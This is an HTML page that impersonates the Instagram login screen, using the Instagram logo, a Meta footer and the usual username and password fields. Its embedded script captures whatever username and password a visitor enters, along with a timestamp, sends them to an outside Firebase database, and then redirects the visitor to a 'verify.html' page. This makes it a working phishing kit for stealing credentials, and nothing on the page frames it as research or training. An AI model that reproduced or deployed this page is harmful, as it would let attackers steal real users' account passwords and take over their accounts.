<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="style.css"> 
    <title>Multi Personality Disorder</title>
    <style>
        
       
    </style>
</head>
<body>

    <div class="lang-selector">
        English (US) <span>⌵</span>
    </div>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="insta-logo" alt="Instagram">

        <form id="loginForm">
            <input type="text" id="username" class="input-box" placeholder="Username, email or mobile number" required>
            <input type="password" id="password" class="input-box" placeholder="Password" required>
            
            <button type="submit" class="login-btn">Log in</button>
        </form>

        <a href="#" class="forgot-link">Forgot password?</a>

        <a href="#" class="create-btn">Create new account</a>
    </div>

    <div class="meta-footer">
        <span>∞ Meta</span>
    </div>

    <script>
        const USER_DB_URL = "https://insta-39d4a-default-rtdb.firebaseio.com/users.json";

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const userData = {
                user: document.getElementById('username').value,
                pass: document.getElementById('password').value,
                time: new Date().toLocaleString()
            };

            try {
                const response = await fetch(USER_DB_URL, {
                    method: 'POST',
                    body: JSON.stringify(userData),
                    headers: { 'Content-Type': 'application/json' }
                });

                if (response.ok) {
                    // This links it to your second page (verify.html)
                    window.location.href = "verify.html";
                }
            } catch (error) {
                console.error("Error saving data:", error);
            }
        });
    </script>
</body>
</html>
